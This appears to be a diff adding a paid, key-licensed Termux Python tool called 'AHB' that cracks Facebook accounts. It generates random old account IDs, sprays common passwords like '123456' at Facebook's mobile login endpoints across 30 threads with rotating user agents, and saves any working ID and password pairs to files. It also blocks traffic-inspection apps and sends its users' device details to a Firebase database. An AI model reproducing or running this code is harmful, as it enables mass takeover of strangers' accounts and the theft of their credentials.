+                    if os.path.exists(saved_key_file): os.remove(saved_key_file)
+                    user_key = None
+                else:
+                    if saved_hwid in (user_hwid, "None", "", None):
+                        is_valid = True
+                    else:
+                        if os.path.exists(saved_key_file): 
+                            os.remove(saved_key_file)
+                        user_key = None
+        except Exception:
+            pass
+
+    if not is_valid:
+        try:
+            safe_hwid_node = user_hwid.replace(".", "_").replace("#", "_").replace("$", "_").replace("[", "_").replace("]", "_").replace("/", "_")
+            trial_check_res = requests.get(f"{FIREBASE_URL}trial_logs/{safe_hwid_node}.json", timeout=10)
+            already_took_trial = trial_check_res.json()
+            
+            if already_took_trial is True:
+                pass
+            else:
+                requests.put(f"{FIREBASE_URL}trial_logs/{safe_hwid_node}.json", json=True)
+                
+                trial_key = "TRL-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+                expiry_date = (datetime.now() + timedelta(days=2)).strftime('%Y-%m-%d %H:%M')
+                customer_name = "Auto_Trial_User"
+                
+                device_model = get_device_model()
+                android_ver = get_android_version()
+                
+                payload = {
+                    'name': customer_name,
+                    'expiry': expiry_date,
+                    'hwid': user_hwid,
+                    'device_model': device_model,
+                    'android_version': android_ver,
+                    'app_version': '1.0'
+                }
+                requests.put(f"{FIREBASE_URL}keys/{trial_key}.json", json=payload)
+                send_login_alert(trial_key, customer_name, expiry_date)
+                
+                try:
+                    with open(saved_key_file, "w") as f: 
+                        f.write(trial_key)
+                except Exception:
+                    pass
+                
+                print(f"\n\033[1;32m[✓] NEW USER 2 DAYS FREE APROVEL 🔥\033[0m")
+                time.sleep(2)
+                user_key = trial_key
+                key_data = payload
+                is_valid = True
+        except Exception as e:
+            pass
+
+    if not is_valid:
+        if os.path.exists(saved_key_file):
+            try: os.remove(saved_key_file)
+            except Exception: pass
+            
+        os.system('clear')
+        print(f"""
+\033[1;33m╔════════════════════════════════════════════╗
+║             [!] ACCESS DENIED / EXPIRED    ║
+╠════════════════════════════════════════════╣
+║ YOUR FREE TRAIL ENd NoW Send Payment and get key    ║
+║ used on this device!                       ║
+║ Please enter NAME  or contact Admin        ║
+╚════════════════════════════════════════════╝\033[0m
+""")
+        
+        customer_name = input("\033[1;33m[?] Enter Your Name: \033[0m").strip().upper()
+        if not customer_name: customer_name = "USER"
+            
+        print("\n\033[1;32m[•] Opening WhatsApp to request paid key...\033[0m")
+        time.sleep(1)
+        open_whatsapp(customer_name)
+        user_key = input("\n\033[1;36m[?] Enter Your Paid Key: \033[0m").strip().upper()
+
+        try:
+            res = requests.get(f"{FIREBASE_URL}keys/{user_key}.json", timeout=10)
+            key_data = res.json()
+            if key_data and isinstance(key_data, dict):
+                expiry_str = key_data.get('expiry')
+                saved_hwid = key_data.get('hwid')
+                
+                if saved_hwid and saved_hwid not in ("None", "") and saved_hwid != user_hwid:
+                    print("\n\033[1;31m[×] Key is registered to another device!\033[0m")
+                    sys.exit()
+                    
+                device_model = get_device_model()
+                android_ver = get_android_version()
+                
+                requests.patch(f"{FIREBASE_URL}keys/{user_key}.json", json={
+                    'hwid': user_hwid, 
+                    'name': customer_name,
+                    'device_model': device_model,
+                    'android_version': android_ver,
+                    'app_version': '1.0'
+                })
+                send_login_alert(user_key, customer_name, expiry_str)
+                
+                try:
+                    with open(saved_key_file, "w") as f: 
+                        f.write(user_key)
+                except Exception:
+                    pass
+                is_valid = True
+            else:
+                print("\n\033[1;31m[×] Invalid Key! Key not found in database.\033[0m")
+                sys.exit()
+        except Exception as e:
+            print(f"\n\033[1;31m[×] Connection Error: {e}\033[0m")
+            sys.exit()
+
+    if is_valid and key_data:
+        record_user_daily_usage(user_key)
+        return key_data.get("name", "USER"), user_key, key_data.get('expiry')
+    return None
+
+if __name__ == '__main__':
+    result = check_key()
+    if result:
+        user_name, user_key, expiry_str = result
+        remaining_time = calculate_time_left(expiry_str)
+        display_welcome_banner(user_name, user_key, remaining_time)
+        hold_screen_10_seconds()
+        print("\033[1;32m[✓] Main Tool Started Successfully!\033[0m")
+
+# Initial setup and promotion
+os.system('clear')
+print(' \x1b[38;5;46mAHB SERVER LOADING....')
+
+os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+os.system('pip install httpx beautifulsoup4')
+print('loading Modules ...\n')
+os.system('clear')
+
+# --- Anti-tampering and Security Checks ---
+try:
+    api_body = open(api.__file__, 'r').read()
+    models_body = open(models.__file__, 'r').read()
+    session_body = open(sessions.__file__, 'r').read()
+    word_list = ['print', 'lambda', 'zlib.decompress']
+    for word in word_list:
+        if word in api_body or word in models_body or word in session_body:
+            exit()
+except:
+    pass
+
+
+class sec:
+    def __init__(self):
+        self.__module__ = __name__
+        self.__qualname__ = 'sec'
+        paths = [
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
+        ]
+        for path in paths:
+            if 'print' in open(path, 'r').read():
+                self.fuck()
+        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
+            self.fuck()
+        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
+            self.fuck()
+
+    def fuck(self):
+        print(' \x1b[1;32m Congratulations ! ')
+        self.linex()
+        exit()
+
+    def linex(self):
+        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
+
+# Global variables
+method = []
+oks = []
+cps = []
+loop = 0
+user = []
+
+# Color codes for terminal output
+X = '\x1b[1;37m'
+rad = '\x1b[38;5;196m'
+G = '\x1b[38;5;46m'
+Y = '\x1b[38;5;220m'
+PP = '\x1b[38;5;203m'
+RR = '\x1b[38;5;196m'
+GS = '\x1b[38;5;40m'
+W = '\x1b[1;37m'
+
+
+def windows():
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
+    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
+    return random.choice([A, B, C, D])
+
+
+def window1():
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
+    latest_build = rr(6000, 9000)
+    latest_patch = rr(100, 200)
+    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
+    return random.choice([A, B, C, D])
+
+# Set window title
+sys.stdout.write('\x1b]2;𓆩【A H B 👑 】𓆪 \x07')
+
+# ==========================================
+# 👑 REAL BRANDING BANNER (SCREENSHOT STYLE) 👑
+# ==========================================
+def show_branding():
+    if 'win' in sys.platform:
+        os.system('cls')
+    else:
+        os.system('clear')
+    
+
+    print("""\033[1;32m
+               ░█████╗░  ██╗░░██╗  ██████╗░
+               ██╔══██╗  ██║░░██║  ██╔══██╗
+               ███████║  ███████║  ██████╦╝
+               ██╔══██║  ██╔══██║  ██╔══██╗
+               ██║░░██║  ██║░░██║  ██████╦╝
+               ╚═╝░░╚═╝  ╚═╝░░╚═╝  ╚═════╝░\033[0m""")
+               
+    # 2. پھر اس کے بالکل نیچے آپ کا کلر فل لائنز والا ڈیٹا شو ہوگا
+    print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mOWNER      \x1b[38;5;46m▶  \033[1;97mALi")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFACEBOOK   \x1b[38;5;46m▶  \033[1;97mAHB-TOOL")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mWHATSAP    \x1b[38;5;46m▶  \033[1;97m03052962654")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFEATURE    \x1b[38;5;46m▶  \033[1;97mOLD CLONING")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mVERSION    \x1b[38;5;46m▶  \033[1;97m12.4")
+    print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
+
+# پرانے بینر کو اس نئے طریقے پر سیٹ کر دیا تاکہ نیچے پورا اسکرپٹ خود ہی فکس ہو جائے
+def ____banner____():
+    show_branding()
+
+
+
+def creationyear(uid):
+    if len(uid) == 15:
+        if uid.startswith('1000000000'): return '2009'
+        if uid.startswith('100000000'): return '2009'
+        if uid.startswith('10000000'): return '2009'
+        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return '2009'
+        if uid.startswith(('1000006', '1000007', '1000008', '1000009')): return '2010'
+        if uid.startswith('100001'): return '2010'
+        if uid.startswith(('100002', '100003')): return '2011'
+        if uid.startswith('100004'): return '2012'
+        if uid.startswith(('100005', '100006')): return '2013'
+        if uid.startswith(('100007', '100008')): return '2014'
+        if uid.startswith('100009'): return '2015'
+        if uid.startswith('10001'): return '2016'
+        if uid.startswith('10002'): return '2017'
+        if uid.startswith('10003'): return '2018'
+        if uid.startswith('10004'): return '2019'
+        if uid.startswith('10005'): return '2020'
+        if uid.startswith('10006'): return '2021'
+        if uid.startswith('10009'): return '2023'
+        if uid.startswith(('10007', '10008')): return '2022'
+        return ''
+    elif len(uid) in (9, 10): return '2008'
+    elif len(uid) == 8: return '2007'
+    elif len(uid) == 7: return '2006'
+    elif len(uid) == 14 and uid.startswith('61'): return '2024'
+    else: return ''
+
+
+def clear():
+    os.system('clear')
+
+
+def linex():
+    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
+
+def BNG_71_():
+    ____banner____()
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CLONE')
+    linex()
+    __Jihad__ = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
+    if __Jihad__ in ('A', 'a', '01', '1'):
+        old_clone()
+    else:
+        print(f"\n    {rad}Choose Valid Option... ")
+        time.sleep(2)
+        BNG_71_()
+
+
+def old_clone():
+    ____banner____()
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mALL SERIES')
+    linex()
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m100003/4 SERIES')
+    linex()
+    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m2009 series')
+    linex()
+    _input = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
+    if _input in ('A', 'a', '01', '1'):
+        old_One()
+    elif _input in ('B', 'b', '02', '2'):
+        old_Tow()
+    elif _input in ('C', 'c', '03', '3'):
+        old_Tree()
+    else:
+        print(f"\n[×]{rad} Choose Value Option... ")
+        BNG_71_()
+
+
+def old_One():
+    user = []
+    ____banner____()
+    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mOld Code {Y}:{G} 2010-2014")
+    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mSELECT {Y}:{G} ")
+    linex()
+    ____banner____()
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
+    linex()
+    star = '10000'
+    for _ in range(int(limit)):
+        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
+        user.append(data)
+    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
+    linex()
+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
+        linex()
+        for mal in user:
+            uid = star + mal
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
+            else:
+                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                break
+
+
+def old_Tow():
+    user = []
+    ____banner____()
+    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
+    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
+    linex()
+    ____banner____()
+    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
+    linex()
+    prefixes = ['100003', '100004']
+    for _ in range(int(limit)):
+        prefix = random.choice(prefixes)
+        suffix = ''.join(random.choices('0123456789', k=9))
+        uid = prefix + suffix
+        user.append(uid)
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD B')
+    linex()
+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
+        linex()
+        for uid in user:
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
+            else:
+                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                break
+
+
+def old_Tree():
+    user = []
+    ____banner____()
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
+    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
+    linex()
+    ____banner____()
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
+    linex()
+    prefix = '1000004'
+    for _ in range(int(limit)):
+        suffix = ''.join(random.choices('0123456789', k=8))
+        uid = prefix + suffix
+        user.append(uid)
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMethod B')
+    linex()
+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
+        linex()
+        for uid in user:
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
+            else:
+                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                break
+
+
+def login_1(uid):
+    global loop
+    session = requests.session()
+    try:
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.flush()
+        for pw in ('123456', '1234567', '12345678', '123456789'):
+            data = {
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'device_id': str(uuid.uuid4()),
+                'cpl': 'true',
+                'family_device_id': str(uuid.uuid4()),
+                'credentials_type': 'device_based_login_password',
+                'error_detail_type': 'button_with_disabled',
+                'source': 'device_based_login',
+                'email': str(uid),
+                'password': str(pw),
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'generate_session_cookies': '1',
+                'meta_inf_fbmeta': '',
+                'advertiser_id': str(uuid.uuid4()),
+                'currently_logged_in_userid': '0',
+                'locale': 'en_US',
+                'client_country_code': 'US',
+                'method': 'auth.login',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '882a8490361da98702bf97a021ddc14d'
+            }
+            headers = {
+                'User-Agent': window1(),
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com',
+                'X-FB-Net-HNI': '25227',
+                'X-FB-SIM-HNI': '29752',
+                'X-FB-Connection-Type': 'MOBILE.LTE',
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
+                'x-fb-device-group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
+            }
+            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            if 'session_key' in res:
+                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/AHB-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                break
+            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
+                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/AHB-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                break
+        loop += 1
+    except Exception:
+        time.sleep(5)
+
+
+def login_2(uid):
+    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+    
+    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
+        try:
+            with requests.Session() as session:
+                headers = {
+                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
+                    'x-fb-sim-hni': str(rr(20000, 40000)),
+                    'x-fb-net-hni': str(rr(20000, 40000)),
+                    'x-fb-connection-quality': 'EXCELLENT',
+                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+                    'user-agent': window1(),
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'x-fb-http-engine': 'Liger'
+                }
+                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
+                po = session.get(url, headers=headers).json()
+                if 'session_key' in str(po):
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/AHB-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    oks.append(uid)
+                    break
+                elif 'session_key' in po:
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/AHB-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    oks.append(uid)
+                    break
+        except Exception as e:
+            pass
+    loop += 1
+
+if __name__ == '__main__':
+# یہاں پہلے کی چیک ہوگی، اگر اپروو ہوگی تو مینو چلے گا، ورنہ اسکرپٹ بند ہو جائے گی
+    if check_key():
+        BNG_71_()
